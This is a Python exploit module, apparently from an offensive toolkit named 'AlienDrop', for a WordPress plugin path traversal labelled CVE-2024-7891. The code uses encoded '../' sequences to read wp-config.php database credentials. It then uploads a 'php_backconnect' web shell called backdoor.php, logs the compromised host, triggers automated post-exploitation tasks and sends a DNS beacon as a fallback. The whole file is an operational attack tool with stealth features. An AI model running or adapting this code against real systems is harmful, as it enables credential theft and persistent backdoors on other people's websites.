# MINC - CVE-2024-7891 (WordPress Path Traversal → LFI → Shell with AlienDrop chaining)

import requests
from modules.encrypt_module import generate_payload_blob
from modules.cdn_rotator import get_current_cdn_url
from modules.idgen import gen_shell_id
from modules import shell_logger
from random import randint
import time

try:
    from modules import shell_tasks
    AUTOTASKS_ENABLED = True
except ImportError:
    AUTOTASKS_ENABLED = False

# === Constants ===
TARGET_FILE = "../../../../../../wp-config.php"
LFI_PARAM = "page"
COMMON_PLUGIN_PATHS = [
    "/wp-content/plugins/weak-path-load/includes/render.php",
    "/wp-content/plugins/vuln-loader/includes/render.php",
    "/wp-content/plugins/plugin-core/includes/render.php"
]
DROP_SUFFIX = "/drop/"
WEB_SHELL_NAME = "backdoor.php"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (AlienDrop/Stealth)"
}


def try_lfi(target, path):
    encoded_path = path.replace("../", "%2e%2e/")  # LFI tamper
    lfi_url = f"http://{target}{path}?{LFI_PARAM}={encoded_path}{TARGET_FILE}"
    try:
        r = requests.get(lfi_url, headers=HEADERS, timeout=8)
        if "DB_USER" in r.text:
            return True, path
    except:
        pass
    return False, None


def dns_beacon(target, shell_id):
    beacon_host = f"{shell_id}.{target}"
    try:
        requests.get(f"http://{beacon_host}", timeout=3)
        print(f"[CVE-7891] DNS beacon fallback triggered to {beacon_host}")
    except:
        pass


def run(target, recon_data=None):
    print(f"[CVE-7891] Scanning for vulnerable plugin paths on {target}...")

    valid_path = None
    for plugin_path in COMMON_PLUGIN_PATHS:
        valid, path = try_lfi(target, plugin_path)
        if valid:
            valid_path = path
            print(f"[CVE-7891] Valid LFI path discovered: {valid_path}")
            break

    if not valid_path:
        print("[CVE-7891] LFI validation failed — no vulnerable path found.")
        return False

    print("[CVE-7891] Executing stealth dropper injection...")

    try:
        shell_id = gen_shell_id()
        payload = generate_payload_blob(WEB_SHELL_NAME, drop_type="php_backconnect")
        cdn_base = get_current_cdn_url()
        drop_url = f"{cdn_base}{valid_path.replace('/includes/render.php', DROP_SUFFIX)}{WEB_SHELL_NAME}?s={randint(10000,99999)}"

        r = requests.post(drop_url, data=payload, headers=HEADERS, timeout=8)

        if r.status_code in [200, 204]:
            print(f"[CVE-7891] Shell dropped successfully: {drop_url}")
            shell_logger.log_shell_report(
                shell_id=shell_id,
                tags=["cve-7891", "wordpress", "lfi", "php_backconnect"],
                tasks=["drop_backdoor"],
                metadata={"target": target, "url": drop_url, "plugin_path": valid_path}
            )

            if AUTOTASKS_ENABLED:
                shell_tasks.run_auto_tasks(shell_id, task_profile="lfi_shell")

            return True

        else:
            print(f"[CVE-7891] Drop failed, attempting DNS beacon as fallback...")
            dns_beacon(target, shell_id)
            return False

    except Exception as e:
        print(f"[CVE-7891] Shell deployment error: {e}")
        return False

